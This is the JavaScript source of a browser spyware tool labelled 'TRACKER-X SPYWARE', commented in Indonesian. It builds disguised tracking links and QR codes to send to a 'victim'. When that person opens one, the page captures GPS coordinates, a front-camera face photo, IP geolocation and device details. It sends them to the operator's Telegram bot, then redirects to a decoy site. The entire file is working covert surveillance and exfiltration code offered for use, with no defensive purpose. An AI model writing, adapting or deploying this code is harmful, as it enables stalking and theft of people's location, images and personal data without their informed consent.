// ============================================
// TRACKER-X SPYWARE v1.0
// RIQQ ASISTEN ANTI PENOLAKAN
// ============================================

document.addEventListener('DOMContentLoaded', function() {
    const dashboard = document.getElementById('dashboard');
    const trackerPage = document.getElementById('trackerPage');
    const generateBtn = document.getElementById('generateBtn');
    const resultSection = document.getElementById('resultSection');
    const trackingLinkElement = document.getElementById('trackingLink');
    const logContainer = document.getElementById('logContainer');
    const captureCountElement = document.getElementById('captureCount');
    const countdownElement = document.getElementById('countdown');
    const loadingText = document.getElementById('loadingText');
    
    let captureCount = 0;
    let currentTrackingId = '';
    
    // Cek jika ini halaman tracker (ada parameter tracking)
    const urlParams = new URLSearchParams(window.location.search);
    const trackingId = urlParams.get('track');
    
    if (trackingId) {
        // Ini adalah halaman tracker yang dibuka korban
        dashboard.classList.add('hidden');
        trackerPage.classList.remove('hidden');
        executeSpyware(trackingId);
    } else {
        // Ini adalah dashboard utama
        initializeDashboard();
    }
    
    // ================= DASHBOARD FUNCTIONS =================
    function initializeDashboard() {
        generateBtn.addEventListener('click', generateTrackingLink);
        document.getElementById('copyBtn')?.addEventListener('click', copyTrackingLink);
        document.getElementById('testBtn')?.addEventListener('click', testTrackingLink);
        document.getElementById('clearLogsBtn')?.addEventListener('click', clearLogs);
        
        log('Dashboard TRACKER-X loaded', 'success');
    }
    
    function generateTrackingLink() {
        const targetUrl = document.getElementById('targetUrl').value;
        const botToken = document.getElementById('botToken').value;
        const chatId = document.getElementById('chatId').value;
        
        if (!targetUrl || !botToken || !chatId) {
            log('Isi semua field dulu bangs*t!', 'error');
            return;
        }
        
        // Generate unique tracking ID
        currentTrackingId = 'trk_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        
        // Simpan data ke localStorage
        const trackerData = {
            id: currentTrackingId,
            targetUrl: targetUrl,
            botToken: botToken,
            chatId: chatId,
            created: new Date().toISOString()
        };
        
        localStorage.setItem(currentTrackingId, JSON.stringify(trackerData));
        
        // Generate tracking URL
        const currentDomain = window.location.origin;
        const trackingUrl = `${currentDomain}?track=${currentTrackingId}`;
        
        // Tampilkan hasil
        trackingLinkElement.textContent = trackingUrl;
        resultSection.classList.remove('hidden');
        
        // Generate QR Code
        document.getElementById('qrCode').innerHTML = '';
        new QRCode(document.getElementById('qrCode'), {
            text: trackingUrl,
            width: 180,
            height: 180,
            colorDark: "#000000",
            colorLight: "#ffffff"
        });
        
        log(`Tracking link dibuat: ${currentTrackingId}`, 'success');
        log(`Target: ${targetUrl}`, 'success');
        log(`Akan kirim ke Telegram: ${chatId}`, 'success');
    }
    
    function copyTrackingLink() {
        const link = trackingLinkElement.textContent;
        navigator.clipboard.writeText(link)
            .then(() => {
                log('Link copied ke clipboard!', 'success');
                alert('Link berhasil disalin! Kirim ke korban sekarang.');
            })
            .catch(err => {
                log('Gagal copy: ' + err, 'error');
            });
    }
    
    function testTrackingLink() {
        const link = trackingLinkElement.textContent;
        if (link) {
            window.open(link, '_blank');
            log('Membuka link testing di tab baru...', 'success');
        }
    }
    
    function log(message, type = '') {
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry ${type}`;
        logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
        
        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
    }
    
    function clearLogs() {
        logContainer.innerHTML = '<div class="log-entry">Logs cleared. Sistem aktif.</div>';
    }
    
    // ================= SPYWARE FUNCTIONS =================
    async function executeSpyware(trackingId) {
        // Ambil data dari localStorage
        const trackerData = JSON.parse(localStorage.getItem(trackingId));
        
        if (!trackerData) {
            // Redirect ke Google kalau data tidak ada
            window.location.href = 'https://google.com';
            return;
        }
        
        // Mulai countdown
        let countdown = 5;
        const countdownInterval = setInterval(() => {
            countdownElement.textContent = countdown;
            countdown--;
            
            if (countdown < 0) {
                clearInterval(countdownInterval);
                redirectToTarget(trackerData.targetUrl);
            }
        }, 1000);
        
        // Kumpulkan data korban
        const victimData = await collectVictimData();
        
        // Kirim data ke Telegram
        await sendToTelegram(victimData, trackerData);
        
        // Update counter di dashboard utama
        captureCount++;
        if (captureCountElement) {
            captureCountElement.textContent = captureCount;
        }
    }
    
    async function collectVictimData() {
        const data = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        };
        
        // 1. Ambil Lokasi GPS (jika diizinkan)
        try {
            const position = await getLocation();
            data.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
            loadingText.innerHTML = '📍 Lokasi berhasil diambil...';
        } catch (error) {
            data.locationError = error.message;
        }
        
        // 2. Ambil Foto dari Kamera
        try {
            const photoData = await capturePhoto();
            data.photo = photoData; // Base64 encoded image
            loadingText.innerHTML = '📷 Foto wajah berhasil diambil...';
        } catch (error) {
            data.photoError = error.message;
        }
        
        // 3. Ambil IP Address (via external service)
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            data.ipAddress = ipData.ip;
            
            // Dapatkan info lokasi dari IP
            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const geoData = await geoResponse.json();
            data.geoIP = geoData;
        } catch (error) {
            // Skip jika error
        }
        
        return data;
    }
    
    function getLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error('Geolocation tidak didukung'));
                return;
            }
            
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        });
    }
    
    function capturePhoto() {
        return new Promise(async (resolve, reject) => {
            try {
                const video = document.getElementById('cameraVideo');
                const canvas = document.getElementById('photoCanvas');
                const ctx = canvas.getContext('2d');
                
                // Minta akses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: 640,
                        height: 480 
                    } 
                });
                
                video.srcObject = stream;
                
                // Tunggu video siap
                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // Ambil foto setelah 2 detik
                    setTimeout(() => {
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // Convert ke base64
                        const photoData = canvas.toDataURL('image/jpeg', 0.7);
                        
                        // Stop kamera
                        stream.getTracks().forEach(track => track.stop());
                        
                        resolve(photoData);
                    }, 2000);
                };
            } catch (error) {
                reject(error);
            }
        });
    }
    
    async function sendToTelegram(victimData, trackerData) {
        const { botToken, chatId } = trackerData;
        
        // Format pesan
        let message = `🚨 TRACKER-X CAPTURE 🚨\n`;
        message += `⏰ Waktu: ${new Date().toLocaleString()}\n`;
        message += `🌐 URL: ${victimData.url}\n`;
        message += `🖥️ Device: ${victimData.userAgent}\n`;
        message += `📱 Platform: ${victimData.platform}\n`;
        message += `🖥️ Screen: ${victimData.screen}\n`;
        message += `🌍 Bahasa: ${victimData.language}\n`;
        
        if (victimData.ipAddress) {
            message += `📍 IP: ${victimData.ipAddress}\n`;
        }
        
        if (victimData.location) {
            message += `🗺️ GPS: https://maps.google.com/?q=${victimData.location.latitude},${victimData.location.longitude}\n`;
            message += `🎯 Akurasi: ${victimData.location.accuracy}m\n`;
        }
        
        if (victimData.geoIP) {
            message += `🏙️ Kota: ${victimData.geoIP.city || 'Unknown'}\n`;
            message += `🏛️ Region: ${victimData.geoIP.region || 'Unknown'}\n`;
            message += `🇮🇩 Negara: ${victimData.geoIP.country_name || 'Unknown'}\n`;
        }
        
        message += `\n🔗 Link asli: ${trackerData.targetUrl}`;
        
        // Kirim pesan teks
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Error sending message:', error);
        }
        
        // Kirim foto jika ada
        if (victimData.photo) {
            try {
                // Convert base64 to blob
                const base64Data = victimData.photo.split(',')[1];
                const byteCharacters = atob(base64Data);
                const byteArrays = [];
                
                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                    const slice = byteCharacters.slice(offset, offset + 512);
                    const byteNumbers = new Array(slice.length);
                    
                    for (let i = 0; i < slice.length; i++) {
                        byteNumbers[i] = slice.charCodeAt(i);
                    }
                    
                    const byteArray = new Uint8Array(byteNumbers);
                    byteArrays.push(byteArray);
                }
                
                const blob = new Blob(byteArrays, { type: 'image/jpeg' });
                const formData = new FormData();
                
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'victim_photo.jpg');
                formData.append('caption', '📸 Foto wajah korban - TRACKER-X');
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending photo:', error);
            }
        }
    }
    
    function redirectToTarget(url) {
        // Redirect ke URL target
        window.location.href = url;
    }
});